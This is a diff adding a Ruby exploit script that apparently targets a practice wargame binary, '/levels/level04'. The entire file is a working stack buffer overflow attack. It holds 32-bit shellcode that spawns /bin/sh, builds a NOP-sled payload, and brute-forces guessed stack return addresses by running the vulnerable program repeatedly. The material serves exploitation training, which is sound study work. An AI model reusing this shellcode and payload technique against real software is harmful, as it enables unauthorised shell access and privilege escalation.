@@ -1,0 +1,47 @@
+#!/usr/bin/env ruby
+
+$exploit = "/levels/level04"
+
+# 32-bit shellcode to load /bin/sh
+$sh = [0x31, 0xc9, 0xf7, 0xe1, 0x51, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0xb0, 0x0b, 0xcd, 0x80, 0x90, 0x90, 0x90]
+
+$buffer = (([0x90] * (1024 - $sh.size)) + $sh).pack('c*')
+
+def try(address)
+	buffer = $buffer.dup
+
+	16.times do
+		# [0xff, 0x9a, 0x91, 0x30].reverse
+		buffer += [address].pack('i')
+	end
+
+	buffer += "\0"
+
+	system($exploit, buffer)
+end
+
+addresses = [0xffdfaf30, 0xff85e5e0, 0xffe3c0e0, 0xfff861e0, 0xfffb6d90, 0xff94b030, 0xfffef290]
+
+def contains_null_byte(address)
+	4.times do
+		if (address & 0xff) == 0
+			return true
+		end
+
+		address >>= 8
+	end
+
+	return false
+end
+
+100.times do |i|
+	offset = i * 4
+
+	addresses.each do |address|
+		stack_address = address + offset
+
+		unless contains_null_byte(address)
+			try(address+offset)
+		end
+	end
+end
